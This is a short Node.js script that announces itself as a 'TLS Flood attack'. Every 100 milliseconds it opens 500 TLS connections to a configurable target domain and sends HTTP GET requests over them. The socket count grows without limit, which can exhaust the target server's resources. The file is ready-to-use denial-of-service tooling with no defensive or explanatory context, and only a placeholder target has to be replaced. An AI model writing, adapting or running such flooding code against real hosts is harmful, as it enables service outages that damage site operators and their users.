const tls = require('tls');

const target = 'example.com'; // Replace with target domain
const port = 443;
const connections = 500; // Number of simultaneous connections

function floodTLS() {
    for (let i = 0; i < connections; i++) {
        const socket = tls.connect({
            host: target,
            port: port,
            rejectUnauthorized: false
        }, () => {
            console.log(`[Connection ${i}] Connected to ${target}:${port}`);
            socket.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\n\r\n');
        });

        socket.on('error', (err) => {
            console.error(`[Connection ${i}] TLS error: ${err.message}`);
        });
    }
}

setInterval(floodTLS, 100); // Repeat flood every 100ms
console.log(`TLS Flood attack started on ${target} with ${connections} connections.`);